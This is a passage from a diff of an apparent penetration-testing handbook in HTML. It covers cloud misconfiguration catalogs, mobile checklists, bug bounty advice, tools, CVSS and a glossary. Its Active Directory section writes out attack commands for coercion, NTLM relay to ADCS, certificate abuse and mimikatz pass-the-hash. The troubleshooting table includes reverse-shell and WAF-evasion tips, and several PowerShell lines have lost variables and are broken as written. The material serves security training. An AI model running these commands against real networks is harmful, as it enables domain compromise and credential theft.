+</ul>
+
+<h3>Day 11-12 — Reporting</h3>
+
+
+<!-- ============ A4 — CLOUD MISCONFIG CATALOG ============ -->
+<h1 id="ap4">☁️ A4 — AWS/Azure/GCP Misconfig Catalog</h1>
+
+<h2>A4.1 Top 30 AWS Misconfigurations</h2>
+<table>
+<tr><th>#</th><th>Misconfiguration</th><th>Detection</th><th>Severity</th></tr>
+<tr><td>1</td><td>S3 bucket public-read</td><td>aws s3api get-bucket-policy, Prowler</td><td>Critical</td></tr>
+<tr><td>2</td><td>S3 ACL public-read</td><td>aws s3api get-bucket-acl</td><td>Critical</td></tr>
+<tr><td>3</td><td>S3 not encrypted at rest</td><td>aws s3api get-bucket-encryption</td><td>High</td></tr>
+<tr><td>4</td><td>S3 Block Public Access disabled</td><td>aws s3control get-public-access-block</td><td>High</td></tr>
+<tr><td>5</td><td>EC2 IMDSv1 enabled</td><td>aws ec2 describe-instances</td><td>High</td></tr>
+<tr><td>6</td><td>EC2 security group 0.0.0.0/0 on port 22/3389</td><td>aws ec2 describe-security-groups</td><td>High</td></tr>
+<tr><td>7</td><td>RDS publicly accessible</td><td>aws rds describe-db-instances</td><td>Critical</td></tr>
+<tr><td>8</td><td>RDS not encrypted</td><td>aws rds describe-db-instances</td><td>High</td></tr>
+<tr><td>9</td><td>IAM policy wildcards ("Action":"*")</td><td>Prowler, enumerate-iam</td><td>Critical</td></tr>
+<tr><td>10</td><td>IAM user with console access and no MFA</td><td>aws iam list-users + get-user</td><td>High</td></tr>
+<tr><td>11</td><td>Old IAM access keys (&gt; 90 days)</td><td>aws iam list-access-keys</td><td>Medium</td></tr>
+<tr><td>12</td><td>Unused access keys</td><td>aws iam get-access-key-last-used</td><td>Medium</td></tr>
+<tr><td>13</td><td>Root account access keys present</td><td>aws iam get-account-summary</td><td>Critical</td></tr>
+<tr><td>14</td><td>Lambda function with admin role</td><td>aws lambda get-function + role inspection</td><td>High</td></tr>
+<tr><td>15</td><td>Lambda env vars with secrets</td><td>aws lambda get-function-configuration</td><td>High</td></tr>
+<tr><td>16</td><td>CloudTrail not enabled</td><td>aws cloudtrail describe-trails</td><td>Critical</td></tr>
+<tr><td>17</td><td>CloudTrail log file validation disabled</td><td>aws cloudtrail describe-trails</td><td>Medium</td></tr>
+<tr><td>18</td><td>CloudTrail logs not encrypted</td><td>aws cloudtrail describe-trails</td><td>Medium</td></tr>
+<tr><td>19</td><td>Cross-account trust looseness</td><td>aws iam list-roles + assume-role-policy</td><td>High</td></tr>
+<tr><td>20</td><td>API Gateway not authenticated</td><td>aws apigateway get-stages</td><td>Critical</td></tr>
+<tr><td>21</td><td>EBS volume not encrypted</td><td>aws ec2 describe-volumes</td><td>High</td></tr>
+<tr><td>22</td><td>Snapshot publicly shared</td><td>aws ec2 describe-snapshots</td><td>Critical</td></tr>
+<tr><td>23</td><td>AMI publicly shared</td><td>aws ec2 describe-images --owners self</td><td>High</td></tr>
+<tr><td>24</td><td>KMS key policy overly permissive</td><td>aws kms list-keys + get-key-policy</td><td>High</td></tr>
+<tr><td>25</td><td>Secrets Manager rotation disabled</td><td>aws secretsmanager describe-secret</td><td>Medium</td></tr>
+<tr><td>26</td><td>VPC flow logs not enabled</td><td>aws ec2 describe-vpcs</td><td>Medium</td></tr>
+<tr><td>27</td><td>Default VPC in use</td><td>aws ec2 describe-vpcs</td><td>Information</td></tr>
+<tr><td>28</td><td>GuardDuty not enabled</td><td>aws guardduty list-detectors</td><td>High</td></tr>
+<tr><td>29</td><td>Security Hub not subscribed</td><td>aws securityhub describe-hub</td><td>Medium</td></tr>
+<tr><td>30</td><td>EKS public endpoint</td><td>aws eks describe-cluster</td><td>High</td></tr>
+</table>
+
+<h2>A4.2 Top 20 Azure Misconfigurations</h2>
+<table>
+<tr><th>#</th><th>Misconfiguration</th><th>Detection</th></tr>
+<tr><td>1</td><td>Storage account public access</td><td>az storage account show</td></tr>
+<tr><td>2</td><td>Storage account network rules default-allow</td><td>az storage account show</td></tr>
+<tr><td>3</td><td>Storage account not using HTTPS only</td><td>az storage account show</td></tr>
+<tr><td>4</td><td>App Service HTTPS-only off</td><td>az webapp show</td></tr>
+<tr><td>5</td><td>App Service allowing FTP</td><td>az webapp show</td></tr>
+<tr><td>6</td><td>App Service client cert off (no mTLS)</td><td>az webapp show</td></tr>
+<tr><td>7</td><td>VM public IP assigned</td><td>az vm list-ip-addresses</td></tr>
+<tr><td>8</td><td>NSG rules 0.0.0.0/0 on sensitive ports</td><td>az network nsg rule list</td></tr>
+<tr><td>9</td><td>Azure AD users with no MFA</td><td>az ad user list + reports</td></tr>
+<tr><td>10</td><td>Conditional Access not enforced</td><td>az ad conditionalaccess list</td></tr>
+<tr><td>11</td><td>Stale guest users</td><td>az ad user list --query "[?userType=='Guest']"</td></tr>
+<tr><td>12</td><td>Service Principals with overly broad roles</td><td>az role assignment list</td></tr>
+<tr><td>13</td><td>Legacy Azure AD Connect (Pass-Through Auth)</td><td>az ad sp list --filter</td></tr>
+<tr><td>14</td><td>Key Vault access policies too broad</td><td>az keyvault show</td></tr>
+<tr><td>15</td><td>Diagnostic logs off on critical services</td><td>az monitor diagnostic-settings list</td></tr>
+<tr><td>16</td><td>Defender for Cloud not enabled</td><td>az security pricing list</td></tr>
+<tr><td>17</td><td>SQL server public access on</td><td>az sql server list</td></tr>
+<tr><td>18</td><td>Open ports on Kubernetes Service</td><td>az aks show</td></tr>
+<tr><td>19</td><td>Function app public access</td><td>az functionapp show</td></tr>
+<tr><td>20</td><td>Logic apps with HTTP triggers no auth</td><td>az logicapp show</td></tr>
+</table>
+
+<h2>A4.3 Top 15 GCP Misconfigurations</h2>
+<table>
+<tr><th>#</th><th>Misconfiguration</th><th>gcloud command</th></tr>
+<tr><td>1</td><td>GCS bucket uniform-bucket-level-access off</td><td>gcloud storage buckets describe</td></tr>
+<tr><td>2</td><td>GCS bucket public (allUsers)</td><td>gcloud storage buckets get-iam-policy</td></tr>
+<tr><td>3</td><td>GCE instance default SA w/ Editor</td><td>gcloud compute instances describe</td></tr>
+<tr><td>4</td><td>Firewall rule 0.0.0.0/0 on port 22/3389</td><td>gcloud compute firewall-rules list</td></tr>
+<tr><td>5</td><td>Legacy IAM roles (Owner, Editor)</td><td>gcloud projects get-iam-policy</td></tr>
+<tr><td>6</td><td>Service account keys (instead of workload identity)</td><td>gcloud iam service-accounts keys list</td></tr>
+<tr><td>7</td><td>BigQuery dataset public</td><td>check in BigQuery IAM</td></tr>
+<tr><td>8</td><td>Cloud SQL public IP enabled</td><td>gcloud sql instances describe</td></tr>
+<tr><td>9</td><td>Cloud SQL not requiring SSL</td><td>gcloud sql instances describe</td></tr>
+<tr><td>10</td><td>GKE basic auth enabled</td><td>gcloud container clusters describe</td></tr>
+<tr><td>11</td><td>Kubernetes RBAC too permissive</td><td>gcloud container clusters get-credentials</td></tr>
+<tr><td>12</td><td>Function public (allUsers)</td><td>gcloud functions get-iam-policy</td></tr>
+<tr><td>13</td><td>Default service account in use</td><td>gcloud projects get-iam-policy</td></tr>
+<tr><td>14</td><td>OS Login disabled</td><td>gcloud compute project-info describe</td></tr>
+<tr><td>15</td><td>Audit logs not all-enabled</td><td>gcloud projects get-iam-policy</td></tr>
+</table>
+
+<h2>A4.4 The Most Cited Cloud Misconfigurations of All Time</h2>
+<ol>
+  <li><strong>Capital One</strong> — WAF EC2 with over-privileged role + SSRF (2019) — $190M</li>
+  <li><strong>Uber</strong> — Hardcoded AWS key in GitHub (2016) — 57M records</li>
+  <li><strong>Twilio / Authy</strong> — Misconfigured S3 (2020)</li>
+  <li><strong>Microsoft AI Studio</strong> — 38TB exposed (2023)</li>
+  <li><strong>Pegasus Airlines</strong> — AWS S3 misconfig (2021) — 6.5TB</li>
+</ol>
+
+
+<!-- ============ A5 — AD PLAYBOOK ============ -->
+<h1 id="ap5">🏰 A5 — Active Directory Attack Playbook</h1>
+
+<h2>A5.1 Recon Commands (PowerView/Secretsdump style)</h2>
+<pre><code class="cmd"># Initial recon as standard user
+.\PsLoggedon.exe \\DC01             # Who's logged in where
+Find-LocalAdminAccess               # Where am I admin?
+Get-NetSession -ComputerName DC01  # Login sessions
+
+# Enumerate domain
+Get-DomainUser -Properties samaccountname,memberof | Out-File -Encoding utf8 users.txt
+Get-DomainGroup "Domain Admins" | Get-DomainGroupMember -Recurse
+Get-DomainComputer -OperatingSystem "*Server*" | ft Name,OperatingSystem
+Get-DomainTrust | ?{(.TrustAttributes -ne 0)} -SourceVerbose  # Trusts
+Get-DomainOU -FullData              # OU structure
+Get-DomainGPO -FullData             # Group Policies
+Get-DomainPolicy                    # Password policy
+
+# ACL analysis (most relevant for BloodHound)
+Find-InterestingDomainAcl -ResolveGUIDs | ?{ .IdentityReference -match "Domain Users"}
+Get-DomainObjectAcl -SamAccountName "Administrator" -ResolveGUIDs
+
+# AS-REP Roastable
+Get-DomainUser -PreauthNotRequired
+Get-DomainUser -SPN | ft samaccountname,serviceprincipalname
+
+# Find SPNs
+Get-DomainUser -SPN | %{ .ServicePrincipalName } | Sort -Unique
+</code></pre>
+
+<h2>A5.2 BloodHound Top Queries You Must Run</h2>
+<ol>
+  <li><strong>Shortest Paths from Domain Users to Domain Admins</strong></li>
+  <li><strong>Shortest Paths from Kerberoastable Users</strong></li>
+  <li><strong>Find all Domain Admins</strong></li>
+  <li><strong>Find Computers where Domain Users are Local Admin</strong></li>
+  <li><strong>Find Principals with DCSync Rights</strong></li>
+  <li><strong>Find all AS-REP Roastable Users</strong></li>
+  <li><strong>Users with most group memberships</strong></li>
+  <li><strong>Find GPOs Modifiable by Domain Users</strong></li>
+</ol>
+
+<h2>A5.3 Coercion Attacks — Force Auth from Servers</h2>
+<pre><code class="cmd"># PetitPotam (forces auth from DC)
+$ python3 PetitPotam.py -u user -p 'Passw0rd!' -d target.local 10.10.10.5 DC01
+
+# Coercer
+$ coercer coerce -u user -p 'Passw0rd!' -d target.local -l 10.10.10.5 -t DC01
+
+# PrinterBug
+$ python3 dementor.py -u user -p 'Passw0rd!' -d target.local DC01 10.10.10.5
+
+# These force DC to authenticate to attacker → NTLM relay → ADCS ESC8!
+</code></pre>
+
+<h2>A5.4 ADCS (Active Directory Certificate Services) Attack</h2>
+<pre><code class="cmd"># Certify enumeration
+$ Certify.exe find /vulnerable
+
+# ESC1: Misconfigured certificate template allows any domain user 
+#       to enroll and specify SAN (subject alternative name = domain admin!)
+$ Certify.exe request /template:User /altname:DOMAIN-ADMIN
+
+# ESC8: ADCS web enrollment endpoint allows NTLM relay
+$ impacket-ntlmrelayx.py -t http://DC01/certsrv/certfnsh.asp -smb2support --adcs
+
+# PetitPotam → relay → ESC8 → get TGT for DC → DCSync!
+</code></pre>
+
+<h2>A5.5 PowerShell Remoting Lateral Movement</h2>
+<pre><code class="cmd"># Enable WinRM
+PS&gt; Enable-PSRemoting -Force
+
+# Connect to remote
+PS&gt; Enter-PSSession -ComputerName DC01 -Credential target\admin
+PS&gt; Invoke-Command -ComputerName (Get-Content .\servers.txt) -ScriptBlock { whoami }
+
+# With Pass-the-Hash
+$ mimikatz # sekurlsa::pth /user:admin /domain:target /ntlm:HASH /run:powershell
+</code></pre>
+
+
+<!-- ============ A6 — MOBILE CHECKLIST ============ -->
+<h1 id="ap6">📱 A6 — Mobile Pentest Checklist</h1>
+
+<h2>A6.1 Android Pentest — 50 Critical Checks</h2>
+
+<h3>A. Static Analysis (15 checks)</h3>
+<ul class="checklist">
+  <li>Manifest: debuggable=true</li>
+  <li>Manifest: allowBackup=true</li>
+  <li>Manifest: exported components (Activity/Service/Receiver)</li>
+  <li>Manifest: dangerous permissions requested</li>
+  <li>Manifest: usesCleartextTraffic=true</li>
+  <li>Manifest: network_security_config</li>
+  <li>Static analysis: cleartext SharedPreferences</li>
+  <li>Static analysis: hardcoded API keys/secrets</li>
+  <li>Static analysis: hardened TLS (network_security_config)</li>
+  <li>Static analysis: certificate pinning implementation</li>
+  <li>Code review: SQL Injection in queries</li>
+  <li>Code review: WebView dangerous settings</li>
+  <li>Code review: Cryptographic best practices</li>
+  <li>Code review: logging sensitive data</li>
+  <li>Battery of MobSF scans</li>
+</ul>
+
+<h3>B. Dynamic Analysis (15 checks)</h3>
+<ul class="checklist">
+  <li>Traffic interception via Burp</li>
+  <li>Certificate pinning bypass</li>
+  <li>Root detection bypass</li>
+  <li>Debug detection bypass</li>
+  <li>Emulator detection bypass</li>
+  <li>App data extraction post-run</li>
+  <li>Backup analysis (adb backup)</li>
+  <li>Runtime memory dump</li>
+  <li>Hook sensitive functions (Frida)</li>
+  <li>API call hooking</li>
+  <li>Crypto bypass</li>
+  <li>Bypass limits / locks</li>
+  <li>Modify in-app purchases</li>
+  <li>Jailbreak/Root state changes</li>
+  <li>Connector to cloud APIs</li>
+</ul>
+
+<h3>C. Backend &amp; Network (10 checks)</h3>
+<ul class="checklist">
+  <li>API endpoint testing</li>
+  <li>IDOR / BOLA in API calls</li>
+  <li>Mass assignment in API parameters</li>
+  <li>JWT validation testing</li>
+  <li>Hardcoded server URLs (dev/staging in prod?)</li>
+  <li>Authentication bypass</li>
+  <li>Authorization flaws</li>
+  <li>Replay attacks</li>
+  <li>SSL stripping</li>
+  <li>Privacy leak in network telemetry</li>
+</ul>
+
+<h3>D. Local Storage &amp; Files (10 checks)</h3>
+<ul class="checklist">
+  <li>/sdcard contents</li>
+  <li>/data/data/&lt;pkg&gt; contents</li>
+  <li>SharedPreferences XML</li>
+  <li>SQLite databases</li>
+  <li>App caches</li>
+  <li>External storage usage</li>
+  <li>Key store usage</li>
+  <li>Insecure random number generators</li>
+  <li>ECB vs CBC mode</li>
+  <li>Hardcoded initialization vectors</li>
+</ul>
+
+<h2>A6.2 iOS Pentest — 40 Critical Checks</h2>
+
+<h3>A. Static (Info.plist + Binary)</h3>
+<ul class="checklist">
+  <li>NSAppTransportSecurity config</li>
+  <li>NSAllowsArbitraryLoads</li>
+  <li>NSExceptionDomains</li>
+  <li>NSExceptionRequiresForwardSecrecy = false</li>
+  <li>Background modes &amp; entitlements</li>
+  <li>App Transport Security exceptions</li>
+  <li>Binary: position-independent executable</li>
+  <li>Binary: stack canaries</li>
+  <li>Binary: ARC enabled</li>
+  <li>Hardcoded URL endpoints (dev!)</li>
+</ul>
+
+<h3>B. Keychain</h3>
+<ul class="checklist">
+  <li>Sensitive data stored insecurely</li>
+  <li>Wrong kSecAttrAccessible flag</li>
+  <li>No kSecAttrAccessGroup scoping</li>
+  <li>kSecAttrSynchronizable enabled (iCloud sync)</li>
+</ul>
+
+<h3>C. Dynamic — Frida Hooks</h3>
+<ul class="checklist">
+  <li>Bypass jailbreak detection</li>
+  <li>Bypass SSL pinning (3 implementations)</li>
+  <li>Hook Crypto CommonCrypto</li>
+  <li>Hook NSUserDefaults reads/writes</li>
+  <li>Hook SecItemCopyMatching</li>
+  <li>Hook URLSession didReceiveChallenge</li>
+  <li>Hook initWithKey: methods</li>
+</ul>
+
+<h3>D. Network</h3>
+<ul class="checklist">
+  <li>Burp proxy interception via mitmproxy</li>
+  <li>Frida bypass + Burp capture</li>
+  <li>API authorization tests</li>
+  <li>JWT/session tests</li>
+  <li>Cached HTTP responses</li>
+  <li>WebSocket traffic</li>
+  <li>Background data transmission check</li>
+  <li>iCloud sync leakage</li>
+  <li>Backup analysis (iMazing, iBackup Extractor)</li>
+  <li>Crash log insensitive data</li>
+</ul>
+
+
+<!-- ============ A7 — BUG BOUNTY ============ -->
+<h1 id="ap7">🏆 A7 — Bug Bounty Methodology</h1>
+
+<h2>A7.1 Picking the Right Programs</h2>
+<table>
+<tr><th>Site</th><th>Best For</th></tr>
+<tr><td>HackerOne</td><td>Mature program list, scope clarity</td></tr>
+<tr><td>Bugcrowd</td><td>Wide variety, VRT (vulnerability rating taxonomy)</td></tr>
+<tr><td>Intigriti</td><td>European programs</td></tr>
+<tr><td>Open Bug Bounty</td><td>Free, low-effort for non-corporate sites</td></tr>
+<tr><td>Federal bounty</td><td>USA gov sites (Hack the Pentagon, etc.)</td></tr>
+</table>
+
+<h2>A7.2 Top Earning Bug Type</h2>
+<table>
+<tr><th>Bug</th><th>Avg Payout</th><th>Why It's $</th></tr>
+<tr><td>Account Takeover (ATO)</td><td>$5K–$50K</td><td>Direct user impact</td></tr>
+<tr><td>RCE</td><td>$10K–$100K</td><td>Worst impact</td></tr>
+<tr><td>SSRF to internal services</td><td>$5K–$30K</td><td>Lateral pivot</td></tr>
+<tr><td>Sensitive data leak</td><td>$3K–$25K</td><td>GDPR/regulatory</td></tr>
+<tr><td>Stored XSS in admin</td><td>$3K–$15K</td><td>Account takeover chain</td></tr>
+<tr><td>IDOR / BOLA with PII</td><td>$2K–$20K</td><td>Per-record impact</td></tr>
+<tr><td>Subdomain takeover</td><td>$500–$5K</td><td>Common but lower impact</td></tr>
+</table>
+
+<h2>A7.3 Reporting Best Practices for $$</h2>
+<ul>
+  <li>Reproducible steps — every command copy-pastable</li>
+  <li>Real-world impact quantification (e.g., "BYPASSES AUTH ON ALL 50M USERS")</li>
+  <li>Screenshots &amp; video PoC</li>
+  <li>Specific remediation advice</li>
+  <li>Respect tone—be respectful, factual</li>
+  <li>Timeline screenshot</li>
+  <li>Disclose within program-to-policy timeframe (often 60–90 days)</li>
+</ul>
+
+
+<!-- ============ A8 — TOOL INVENTORY ============ -->
+<h1 id="ap8">🛠️ A8 — Pentest Tool Master Inventory</h1>
+
+<h2>A8.1 Kali Linux Top Tools</h2>
+<div class="grid-3">
+<div class="card"><h4>Recon</h4><p>nmap, masscan, RustScan, dnsenum, subfinder, amass</p></div>
+<div class="card"><h4>Web</h4><p>Burp Suite, OWASP ZAP, nikto, ffuf, wfuzz, sqlmap, xsstrike</p></div>
+<div class="card"><h4>Passwords</h4><p>Hydra, John, Hashcat, Medusa, Patator</p></div>
+<div class="card"><h4>Network</h4><p>Wireshark, tcpdump, ettercap, Responder, mitmproxy</p></div>
+<div class="card"><h4>Exploitation</h4><p>Metasploit, searchsploit, Beef-XSS, Empire, Covenant</p></div>
+<div class="card"><h4>AD / Windows</h4><p>mimikatz, BloodHound, CrackMapExec, Impacket, evil-winrm</p></div>
+<div class="card"><h4>Wireless</h4><p>aircrack-ng, wifite, kismet, bettercap, hostapd-wpe</p></div>
+<div class="card"><h4>Cloud</h4><p>Prowler, ScoutSuite, Cloudsplaining, Pacu, Stratus</p></div>
+<div class="card"><h4>Code Review</h4><p>Semgrep, CodeQL, Bandit, gosec, pmd, find-sec-bugs</p></div>
+<div class="card"><h4>Containers</h4><p>trivy, grype, kube-hunter, kube-bench, falco</p></div>
+<div class="card"><h4>Reporting</h4><p>dradis, Faraday, Plextrac, Serpico</p></div>
+<div class="card"><h4>Mobile</h4><p>apktool, jadx, frida, objection, mobsf</p></div>
+</div>
+
+<h2>A8.2 Tool Categorization by Skill</h2>
+<table>
+<tr><th>Level</th><th>Tools</th><th>Why</th></tr>
+<tr><td>Beginner</td><td>nmap, Burp Community, Nikto</td><td>Easy, visual</td></tr>
+<tr><td>Intermediate</td><td>sqlmap, hashcat, BloodHound, Frida</td><td>Need understanding</td></tr>
+<tr><td>Advanced</td><td>Pacu, Metasploit custom modules, Ghidra</td><td>Custom scripting</td></tr>
+<tr><td>Expert</td><td>Custom exploits, kernel debugging, Fuzzing</td><td>Novel research</td></tr>
+</table>
+
+<h2>A8.3 Where to Find New Tools</h2>
+<ul>
+  <li><strong>Kali Linux</strong> — kali.org/tools</li>
+  <li><strong>GitHub trending</strong> — github.com/trending</li>
+  <li><strong>SecLists</strong> — github.com/danielmiessler/SecLists (payloads!</li>
+  <li><strong>Awesome Pentest</strong> — github.com/enaqx/awesome-pentest</li>
+  <li><strong>HackerOne Hacktivity</strong> — real disclosed reports</li>
+  <li><strong>Conference talks</strong> — DEF CON, Black Hat YouTube</li>
+</ul>
+
+
+<!-- ============ A9 — TROUBLESHOOTING ============ -->
+<h1 id="ap9">🔧 A9 — Engagement Troubleshooting Matrix</h1>
+
+<table>
+<tr><th>Problem</th><th>Cause</th><th>Solution</th></tr>
+<tr><td>Burp won't intercept HTTPS</td><td>CA not installed</td><td>Visit http://burp, save cert, install in browser</td></tr>
+<tr><td>Mobile app refuses Burp cert</td><td>SSL pinning</td><td>Frida bypass; or patch APK</td></tr>
+<tr><td>nmap returns nothing</td><td>ICMP blocked</td><td>Use -Pn + -PS/-PA</td></tr>
+<tr><td>SQLMap "not injectable"</td><td>WAF blocking</td><td>Try --tamper; test in headers; --risk/--level</td></tr>
+<tr><td>Hydra says "too many connections"</td><td>Rate limit</td><td>Reduce -t to 1-4; add --wait</td></tr>
+<tr><td>Can't get reverse shell</td><td>Firewall egress port</td><td>Use HTTPS (443) or DNS</td></tr>
+<tr><td>Mimikatz fails: ERROR 5</td><td>Need admin</td><td>Run privilege::debug, then sekurlsa</td></tr>
+<tr><td>BloodHound upload says invalid</td><td>Wrong JSON format</td><td>Re-run sharphound/bloodhound-python</td></tr>
+<tr><td>Hashcat shows "No devices found"</td><td>GPU drivers</td><td>Install OpenCL/CUDA drivers</td></tr>
+<tr><td>AD compromise hours stuck</td><td>Privileged account locked</td><td>Set TTL on bloodhound queries; respect lockouts</td></tr>
+<tr><td>Kubernetes API returns 401</td><td>RBAC; need kubeconfig</td><td>Offer stolen/default SA tokens, look elsewhere</td></tr>
+<tr><td>AWS account locked (AccessDenied 403)</td><td>Permissions; cross-region</td><td>Check with whoami, who's at, regions</td></tr>
+<tr><td>Cloud lab setup fails</td><td>Free-tier limits</td><td>Add payment method, watch usage carefully</td></tr>
+<tr><td>Reverse shell exhibits strange characters</td><td>Stty not set</td><td>python3 pty + Ctrl-Z + stty raw -echo + fg</td></tr>
+<tr><td>Google reCAPTCHA blocks test</td><td>Detection of automation</td><td>Use session tokens, dedicated test accounts</td></tr>
+<tr><td>iOS Frida not connecting</td><td>USB connection / lockdown</td><td>Use -U; check libusbmuxd, ideviceinstaller</td></tr>
+<tr><td>WAF blocks all requests</td><td>WAF detected signature</td><td>Test through legit payloads / user-agent spoofing</td></tr>
+<tr><td>Mobile app crashes when hooked</td><td>App detects Frida</td><td>Bypass Frida detection (offuscate hooking)</td></tr>
+</table>
+
+
+<!-- ============ A10 — CVSS CALC ============ -->
+<h1 id="ap10">🧮 A10 — Quick CVSS Calculator</h1>
+
+<p>Use the table below to compute CVSS v3.1 score quickly:</p>
+
+<h2>Step 1 — Base Metrics (Exploitability)</h2>
+<table>
+<tr><th>Metric</th><th>Possible values (each adds to score)</th></tr>
+<tr><td>AV (Attack Vector)</td><td>N (Network) = 0.85, A (Adjacent) = 0.62, L (Local) = 0.55, P (Physical) = 0.2</td></tr>
+<tr><td>AC (Attack Complexity)</td><td>L (Low) = 0.77, H (High) = 0.44</td></tr>
+<tr><td>PR (Privileges Required)</td><td>N (None) = 0.85, L (Low) = 0.62/0.68, H (High) = 0.27/0.5</td></tr>
+<tr><td>UI (User Interaction)</td><td>N (None) = 0.85, R (Required) = 0.62</td></tr>
+</table>
+
+<h2>Step 2 — Impact (CIA)</h2>
+<table>
+<tr><th>Metric</th><th>Possible values</th></tr>
+<tr><td>C (Confidentiality)</td><td>H (High) = 0.56, L (Low) = 0.22, N (None) = 0</td></tr>
+<tr><td>I (Integrity)</td><td>H (High) = 0.56, L (Low) = 0.22, N (None) = 0</td></tr>
+<tr><td>A (Availability)</td><td>H (High) = 0.56, L (Low) = 0.22, N (None) = 0</td></tr>
+</table>
+
+<h2>Step 3 — Severity Bands</h2>
+<table>
+<tr><th>Score Range</th><th>Severity</th></tr>
+<tr><td>0.0</td><td>None / Informational</td></tr>
+<tr><td>0.1–3.9</td><td>Low</td></tr>
+<tr><td>4.0–6.9</td><td>Medium</td></tr>
+<tr><td>7.0–8.9</td><td>High</td></tr>
+<tr><td>9.0–10.0</td><td>Critical</td></tr>
+</table>
+
+<h2>Common CVSS Vectors Shortcuts</h2>
+<table>
+<tr><th>Scenario</th><th>Vector</th><th>Score</th></tr>
+<tr><td>Network SQL Injection nothing required</td><td>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</td><td>9.8</td></tr>
+<tr><td>Stored XSS admin-only auth</td><td>AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N</td><td>5.4</td></tr>
+<tr><td>RCE requiring local user</td><td>AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</td><td>7.8</td></tr>
+<tr><td>Network info disclosure nothing required</td><td>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</td><td>7.5</td></tr>
+<tr><td>Stored XSS with priv escalation</td><td>AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N</td><td>8.0</td></tr>
+</table>
+
+<p>👉 Use a calculator: <code>https://www.first.org/cvss/calculator/3.1</code></p>
+
+
+<!-- ============ A11 — GLOSSARY ============ -->
+<h1 id="ap11">📖 A11 — Glossary of VAPT Terms</h1>
+
+<table>
+<tr><th>Term</th><th>Definition</th></tr>
+<tr><td>Asset</td><td>Anything of value to the organization (data, system, person)</td></tr>
+<tr><td>Threat</td><td>Anything that can harm an asset</td></tr>
+<tr><td>Vulnerability</td><td>Weakness that can be exploited</td></tr>
+<tr><td>Risk</td><td>Likelihood × Impact</td></tr>
+<tr><td>Exploit</td><td>Code or technique using a vulnerability</td></tr>
+<tr><td>Payload</td><td>Code executed by exploit after success</td></tr>
+<tr><td>Post-exploit</td><td>Activity after gaining access</td></tr>
+<tr><td>Persistence</td><td>Maintaining access across reboots/sessions</td></tr>
+<tr><td>Privilege Escalation</td><td>Gaining higher access than initially had</td></tr>
+<tr><td>Lateral Movement</td><td>Moving between systems at same privilege</td></tr>
+<tr><td>C2 (Command &amp; Control)</td><td>Sustained attacker-server communication</td></tr>
+<tr><td>TTP</td><td>Tactics, Techniques &amp; Procedures</td></tr>
+<tr><td>CVE</td><td>Common Vulnerabilities &amp; Exposures ID</td></tr>
+<tr><td>CVSS</td><td>Common Vulnerability Scoring System</td></tr>
+<tr><td>CWE</td><td>Common Weakness Enumeration</td></tr>
+<tr><td>PoC</td><td>Proof of Concept</td></tr>
+<tr><td>Zero-Day</td><td>Vulnerability unpatched by vendor</td></tr>
+<tr><td>DA (Domain Admin)</td><td>Highest privilege account in AD</td></tr>
+<tr><td>DCSync</td><td>Replicate credentials from a DC</td></tr>
+<tr><td>Golden Ticket</td><td>Forged Kerberos TGT — domain access</td></tr>
+<tr><td>SSRF</td><td>Server-Side Request Forgery</td></tr>
+<tr><td>IDOR</td><td>Insecure Direct Object Reference</td></tr>
+<tr><td>BOLA</td><td>Broken Object-Level Authorization</td></tr>
+<tr><td>XSS</td><td>Cross-Site Scripting</td></tr>
+<tr><td>SQLi</td><td>SQL Injection</td></tr>
+<tr><td>RCE</td><td>Remote Code Execution</td></tr>
+<tr><td>SSO</td><td>Single Sign-On</td></tr>
+<tr><td>MFA</td><td>Multi-Factor Authentication</td></tr>
+<tr><td>PIM/PAM</td><td>Privileged Identity/Access Management</td></tr>
+<tr><td>EDR</td><td>Endpoint Detection &amp; Response</td></tr>
+<tr><td>SIEM</td><td>Security Information &amp; Event Management</td></tr>
+<tr><td>SOAR</td><td>Security Orchestration, Automation, Response</td></tr>
+<tr><td>SOC</td><td>Security Operations Center</td></tr>
+<tr><td>SCA</td><td>Software Composition Analysis</td></tr>
+<tr><td>SAST/DAST/IAST</td><td>Static/Dynamic/Interactive App Sec Testing</td></tr>
+<tr><td>SBOM</td><td>Software Bill of Materials</td></tr>
+<tr><td>WAF</td><td>Web Application Firewall</td></tr>
+<tr><td>API Gateway</td><td>Service that fronts APIs</td></tr>
+<tr><td>CSP</td><td>Content Security Policy (header)</td></tr>
+<tr><td>HSTS</td><td>HTTP Strict Transport Security</td></tr>
+<tr><td>JWT</td><td>JSON Web Token</td></tr>
+<tr><td>OIDC</td><td>OpenID Connect</td></tr>
+<tr><td>SAML</td><td>Security Assertion Markup Language</td></tr>
+<tr><td>OAuth 2.0</td><td>Authorization framework</td></tr>
+<tr><td>K8s</td><td>Kubernetes</td></tr>
+<tr><td>IaC</td><td>Infrastructure as Code</td></tr>
+<tr><td>OT/ICS</td><td>Operational Technology / Industrial Control System</td></tr>
+<tr><td>SCADA</td><td>Supervisory Control and Data Acquisition</td></tr>
+<tr><td>PLC</td><td>Programmable Logic Controller</td></tr>
+<tr><td>IoT</td><td>Internet of Things</td></tr>
+<tr><td>SDR</td><td>Software Defined Radio</td></tr>
+<tr><td>UART</td><td>Universal Asynchronous Receiver-Transmitter (debug port)</td></tr>
+</table>
+
+
+<!-- ============ A12 — READING LIST ============ -->
+<h1 id="ap12">📚 A12 — Reading List &amp; Resources</h1>
+
+<h2>Books Worth Reading</h2>
+<ul>
+  <li><strong>The Web Application Hacker's Handbook (Stuttard, Pinto)</strong> — Must-read baseline</li>
+  <li><strong>Hacking Exposed 7</strong> — Network pentest complete</li>
+  <li><strong>The Hacker Playbook 3 (Peter Kim)</strong> — Pentest flows</li>
+  <li><strong>Penetration Testing (Georgia Weidman)</strong> — Beginner-friendly</li>
+  <li><strong>Red Team Field Manual (Ben Clark)</strong> — Cheat sheet</li>
+  <li><strong>Tribe of Hackers (Marcus Carey)</strong> — Career advice</li>
+  <li><strong>Cloud Pentesting (Victor Yamayev)</strong> — AWS/Azure/GCP</li>
+  <li><strong>AWS Penetration Testing (Jonathan Bittner)</strong></li>
+  <li><strong>Black Hat Python (Justin Seitz)</strong> — Tool dev</li>
+  <li><strong>The Tangled Web (Michal Zalewski)</strong> — Browser security</li>
+  <li><strong>Iron-Clad Java (Jim Manico, August Detlefsen)</strong> — Java secure coding</li>
+</ul>
+
+<h2>Websites &amp; Resources</h2>
+<ul>
